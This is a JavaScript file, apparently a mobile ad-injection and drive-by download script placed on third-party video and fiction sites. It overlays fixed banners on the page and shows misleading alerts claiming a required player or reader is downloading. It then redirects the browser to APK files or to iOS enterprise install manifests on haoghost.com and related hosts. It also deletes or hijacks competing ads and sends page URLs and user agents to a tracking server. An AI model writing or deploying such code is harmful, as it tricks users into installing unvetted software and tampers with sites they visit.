var hy_itv=setInterval(function(){
	if(!document || !document.body) return;
	else clearInterval(hy_itv);
	function setCookie(name,value){
        var Days = 30;  
        var exp  = new Date();  
        exp.setTime(exp.getTime() + Days*24*60*60*1000);  
        document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+";path=/";  
	}  

	function getCookie(name)
	{
		var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
	 
		if(arr=document.cookie.match(reg))
	 
			return (arr[2]);
		else
			return null;
	}

	var getJsonp = function( url, data, callback, str )
	{
		var script = document.createElement("script"),
			target = document.getElementsByTagName("head")[0],
			obj = null;
		script.type = "text/javascript";
		script.language = "javascript";
		if(str){this[str]=callback;}
		this.jsonpcallback=callback;
		var data = data ? "&" + data : "",
			isOp = /\?{1}/.test( url ),
			domain = isOp ? url.slice( 0, url.search( /\?{1}/ ) ) : url,
			option = isOp ?  url.slice( url.search( /\?{1}/ ) + 1 ) + data : data;
		script.src = domain + "?"  + option;
		target.appendChild( script );
		script.onload = script.onreadystatechange = function()
		{
			
			if (!this.readyState || this.readyState === "loaded" || this.readyState === "complete" )
			{
				callback( null , obj );
				this.onload = this.onreadystatechange = null;
				this.parentNode.removeChild( this );
			};
		};
		return obj;
	};

	var num=hy_cpc_num || "10",imgPath="http://m.haoghost.com/images/",downPath="http://d.haoghost.com/",isup=2;
	var pname=getDownUrl(),iosname=getIosDownUrl();

	var azimgs=["wb_b2.gif","wb_n1.gif","wb_b3.gif","wb_n2.gif","test1.jpg","test2.jpg"],
		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/games2.html","http://m.haoghost.com/games3.html"],
		aztooltip=["","","","","",""];

	

	if(num==31 || num==40)
	{
		azimgs=["wb_b3.gif","wb_b5.gif","wb_b2.gif"];
		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/?f=cpctag_"+num];
		aztooltip=["","",""];
	}
	

	//正在下载娇羞小苹果,少妇的秘密尽在其中 正在下载书旗小说,千万图书库离线观看

	var alen=azimgs.length;
	if(num==24||num==25||num==26 || num==29 || num==31 || num==72) isup=1;
	function getNum(){
		var num=parseInt(getCookie("hy_visit_time"));
		if(isNaN(num))
		{
			num=0;
		}
		if(num>=alen) num=0;
		setCookie("hy_visit_time",num+isup);
		return num;

	}
	var thisnum=getNum(),thisnumplus=thisnum==alen-1?0:thisnum+1;


	if(getCookie("hycpc1")=="1"){
		pname="360ysdq12.apk";
		iosname="http://www.haima.me/?c=cpapz";
		setCookie("hycpc1","0");
	}

	var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes(),rd=Math.random();
	function notNight()
	{
		return (hour>9) || (hour==9 && minute>30);
	}
	function hlTime()
	{
		return (hour>=8) && (hour<23);	
	}

	function getDownUrl()
	{
		if(/ipad|iphone|ipod/i.test(navigator.userAgent))
		{
			return getIosDownUrl();
		}
		else
		{
			return getAndroidDownUrl();
		}
	}

	function getIosDownUrl()
	{
		var result;
		switch(num)
		{
			case "16":
				result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
				break;
			default:
				if(rd<0.001) result="http://tg.xyzs.com/dt/iphone.php?ref=cpa24";
				else result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
		}
		return result;
	}

	function getAndroidDownUrl()
	{
		var result;
		switch(num)
		{
			case "36":
				result="360ysdq12.apk";
				break;
			default:
				if(rd<0.5) result="http://d.haoghost.com/kbyy2.apk";
				else result="http://d.zhxone.com/11678116";
		}
		return result;
	}

	function getAndroidImage(str)
	{
		if(str=="top")
		{
			return imgPath+azimgs[thisnumplus];
		}
		if(str=="bottom")
		{
			return imgPath+azimgs[thisnum];
		}
	}

	function getIosImage(str)
	{
		if(str=="top")
		{
			return imgPath+"wb_t2.gif";
		}
		if(str=="bottom")
		{
			return imgPath+"wb_ios2.gif";
		}
	}
	function isDownSelf()
	{
		if(hour==8) return true;
		var rd=Math.random();
		return rd>0.001?true:false;
	}

	if(/android/i.test(navigator.userAgent) || /ipad|iphone|ipod/i.test(navigator.userAgent))
	{
		
		function autoDown()
		{
			var date = new Date();
			var cd=10;
			if(num==41 || num==42) cd=60*24;
			if(num==43) cd=60;
			if(!getCookie("hycookietime"))
			{
				setCookie("hycookietime",date.getTime());
				return true;
			}
			else
			{
				var now=date.getTime(),before=parseInt(getCookie("hycookietime"));
				if(now-before>cd * 60 * 1000)
				{
					setCookie("hycookietime",now);
					return true;
				}
			}

			return false;
		}

		

		var num1="tag_"+num+"1",num2="tag_"+num+"2",azlink=azlinks[thisnum],ioslink="http://m.haoghost.com/ios.html?f=cpctag_"+num,lastlink=azlinks[0];
		var toplink='<a href="'+azlinks[thisnumplus]+'" id="hy_'+num1+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+getAndroidImage("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		var bottomlink='<a href="'+azlinks[thisnum]+'" id="hy_'+num2+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+getAndroidImage("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		if(/ipad|iphone|mac|ios/i.test(navigator.userAgent))
		{
			lastlink=ioslink;
			num1="tag_"+num+"3";num2="tag_"+num+"4";
			toplink='<a href="'+ioslink+'" id="hy_'+num1+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+getIosImage("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
			bottomlink='<a href="'+ioslink+'" id="hy_'+num2+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+getIosImage("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		}
		var str='<div id="hy_cpc_top" style="text-align: center;display: block;width: 100%;filter: alpha(opacity=90);-moz-opacity: 0.9;-khtml-opacity: 0.9;opacity: 1;position: fixed;top: 0px;left: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;">'+
			toplink+'</div><div id="hy_cpc_bottom" style="text-align: center;display: block;width: 100%;opacity: 1;position: fixed;bottom: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;right: 0px;">'+
			bottomlink+'</div><div id="hy_cpc_tj" style="display:none"></div>';
		var div=document.createElement("div");
		div.innerHTML=str;

		document.body.appendChild(div);
		var ww=window.screen.width;
		ww=ww>400?360:ww;
		var t1=document.getElementById("hy_"+num1),t2=document.getElementById("hy_"+num2),wh=ww*90/435,h1=document.getElementById("hy_cpc_top"),h2=document.getElementById("hy_cpc_bottom"),i1=document.getElementById("hy_cpc_imgt"),i2=document.getElementById("hy_cpc_imgb");
		
		(function(){
			var script = document.createElement("script");
			var tj=document.getElementById("hy_cpc_tj");
			script.type = "text/javascript";
			script.language = "javascript";
			script.src="http://s95.cnzz.com/stat.php?id=1253202217";
			tj.appendChild(script);
		})()		

		if(num==24 || num==25 || num==26 || num==29 || num==31 || num==40 || num==43 || num==71 || num==72)
		{
			t1.style.display="none";
		}
		else
		{
			document.body.style["padding-top"]=wh+"px";
		}

		ww=ww>1305?1305:ww;
		
		document.body.style["padding-bottom"]=wh+"px";
		
		document.getElementById("hy_cpc_tclose").addEventListener("touchstart",function(event){
			h1.style.display="none";
			document.body.style["padding-top"]="0px";
			if (event.stopPropagation) {
				event.stopPropagation(); 
			} 
			else if (window.event) { 
				window.event.cancelBubble = true; 
			}
			return false;
		},false);
		document.getElementById("hy_cpc_bclose").addEventListener("touchstart",function(event){
			h2.style.display="none";
			document.body.style["padding-bottom"]="0px";
			if (event.stopPropagation) {
				event.stopPropagation(); 
			} 
			else if (window.event) { 
				window.event.cancelBubble = true; 
			}
			return false;
		},false);

		var ua=navigator.userAgent;

		(function(){

			var tt=document.getElementsByTagName("title")[0].innerHTML;


			var hyipdata=parseInt(getCookie("hyipdata"));
			/*getJsonp(
				'http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',
				"",
				function(data){
					var res=false;
					if(!res && Math.random()>0.25)
					{
						setCookie("hyipdata","0");
						if(hlTime())
						{
							pname="Qvod_collect_v3.14.5.apk";
							getJsonp(
								'http://click.shuiguo.com/index.php?action=index&method=main1',
								"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
								function(data){

								}
							);
						}
					}
					if(res)
					{
						setCookie("hyipdata","1");
					}
					goCityDown();
				},
				"hyipcb"
			);*/
			if(isDownSelf())
			{
				setCookie("hyipdata","0");
				if(num==43) pname="Qvod_collect_wap1_v3.14.21.apk";
				else pname="Qvod_collect_v3.14.21.apk";
				/*getJsonp(
					'http://click.shuiguo.com/index.php?action=index&method=main1',
					"t=undefined&s=tag_890&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
					function(data){

					}
				);
				var script = document.createElement("script");
				script.type = "text/javascript";
				script.language = "javascript";
				script.src="http://s13.cnzz.com/stat.php?id=1253232964&web_id=1253232964";
				var tj=document.getElementById("hy_cpc_tj");
				tj.appendChild(script);*/
			}
			else
			{
				setCookie("hyipdata","1");
			}
			goCityDown();
			function goCityDown(){
				window.setTimeout(function(){
					if(num==18 || num==19 || num==31 || num==32 || num==33 || num==35 || num==36 || num==37 || num==39 || num==41 || num==42 || num==43)
					{
						if(!autoDown()) return;
						if(tt.indexOf("》")<0)
						{
							tt="正在为您下载本站专用手机播放器，安装后即可观看本站所有电影视频";
						}
						else
						{
							tt=tt.split("》")[0]+"》";
							tt="正在为您下载本站专用手机播放器，安装后即可观看"+tt;
						}
					} 
					else if(num==15 || num==28 || num==29 || num==34 || num==38 || num==44)
					{
						if(!autoDown()) return;
						tt="正在下载快播典藏版，你懂的";
					}
					else if(num==23 || num==24 || num==25 || num==26 || num==27){
						if(!autoDown()) return;
						tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
					}
					else
					{
						return;
					}

					function DownPackage(name,url)
					{
						if(num==38 || num==43)
						{
							if(confirm(name)) 
							{
								tureDP(url);
							}
						}
						else
						{
							alert(name);
							tureDP(url);
						}
					}

					function tureDP(url)
					{
						if(url.indexOf("http")>=0) window.location.href=url;
						else window.location.href="http://d.haoghost.com/"+url;
						setCookie("hycpc1","1");
					}

					if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
						DownPackage(tt,iosname);
					}
					else
					{
						DownPackage(tt,pname);
					}
				},1000);
			}
			
			
		})();


		window.setInterval(function(){
			function hideAdv(id)
			{
				var adv=document.getElementById(id);
				if(adv) adv.parentNode.removeChild(adv);
			}
			var clear_num=0;
			function regHideAdv(str)
			{
				var divs=document.getElementsByTagName("div");
				for(var i=0,temp;temp=divs[i];i++)
				{
					var idstr=temp.getAttribute("id");
					if(idstr && idstr.indexOf(str)>-1){
						temp.parentNode.removeChild(temp);
						clear_num=1;
					}
				}
			}
			if(num==27)
			{
				hideAdv("lgVshow");
			}
			if(num==28)
			{
				if(clear_num==1) return;
				regHideAdv("star8");
			}
			if(num==31)
			{
				regHideAdv("BAIDU_DUP");
			}
			if(num==32)
			{
				hideAdv("__70e_1");hideAdv("__70e_2");hideAdv("xcy_fmt");t2.style.display="";
			}
			if(num==33)
			{
				hideAdv("cs_right_bottom");
			}
			if(num==36)
			{
				hideAdv("JS_BottmEX2_Div");
			}
			if(num==39)
			{
				hideAdv("__QQCP_LEFT_Div");hideAdv("__QQCP_RIGHT_Div");hideAdv("xcy_fmt");
			}
			if(num==22)
			{
				
				hideAdv("__keyrun_RM_Div");
				var t22a,t22b=document.getElementById("viewxxx");
				if(t22b) t22b.setAttribute("href",lastlink);
				if(window.frames["baidu_clb_slot_iframe_984242_0"].document) t22a=window.frames["baidu_clb_slot_iframe_984242_0"].document.getElementsByTagName("a")[0];
				if(window.frames["BAIDU_DUP_wrapper_984242_0"].document) t22a=window.frames["BAIDU_DUP_wrapper_984242_0"].document.getElementsByTagName("a")[0];
				if(t22a) t22a.setAttribute("href",lastlink);
			}
			if(num==18 || num==19)
			{
				hideAdv("q1q2a3d4d5iva");
				var d=document.getElementById("JS_BottmEX2_Div");
				var i=document.getElementsByTagName("ins");
				var as=document.getElementsByTagName("a"),str_gg=[];
				str_gg[0]="http://cnrdn.com/fyRE";
				str_gg[1]="http://xiazai.3ddianshiji.com/i/";
				str_gg[2]="http://download.wuji.com:6677/wuji/setup/";
				str_gg[3]="http://dl.client.baidu.com/union/";
				str_gg[4]="http://pc.cyousoft.com/shouqu_126_10.html";
				str_gg[5]="http://www.baidu.com/cb.php?";
				str_gg[6]="http://www.z3330.com";
				str_gg[7]="http://vs.cyousoft.com";
				if(d) d.style.display="none";
				if(i[0]) i[0].style.display="none";
				for(var i=0;i<as.length;i++)
				{
					var temp=as[i].getAttribute("href");
					if(!temp) continue;
					for(var j=0;j<str_gg.length;j++)
					{
						if(temp.indexOf(str_gg[j])>-1){as[i].setAttribute("href",lastlink);break;}
					}
					
				}
			}
		},500);

		if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {return};
		

		var script = document.createElement("script");
		script.type = "text/javascript";
		script.language = "javascript";
		script.src="http://v1.cnzz.com/stat.php?id=1253417451&web_id=1253417451";
		//script.src="http://js.users.51.la/17318300.js";
		//script.src = "http://s95.cnzz.com/stat.php?id=1253099509&web_id=1253099509";
		
		var tj=document.getElementById("hy_cpc_tj");
		tj.appendChild(script);

		function send(obj,num)
		{
			setTimeout(function(){
				getJsonp(
					'http://click.shuiguo.com/index.php?action=index&method=main1',
					"t=undefined&l="+obj+"&s="+num+"&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
					function(data){

					}
				);
			},0);

		}
		
		if(aztooltip[thisnumplus]!="")
		{
			i1.addEventListener("touchend",function(){send(t1.getAttribute("href"),"88"+thisnumplus);alert(aztooltip[thisnumplus]);});
		}
		if(aztooltip[thisnum]!="")
		{
			i2.addEventListener("touchend",function(){send(t2.getAttribute("href"),"88"+thisnum);alert(aztooltip[thisnum]);});
		}
		
		
	}
},500)


/*send("","tag_"+num+"9");
window.setTimeout(function(){
	t1.setAttribute("href","http://d.haoghost.com/360ysdq.apk");
	t2.setAttribute("href","http://d.haoghost.com/360ysdq.apk");
},1000);*/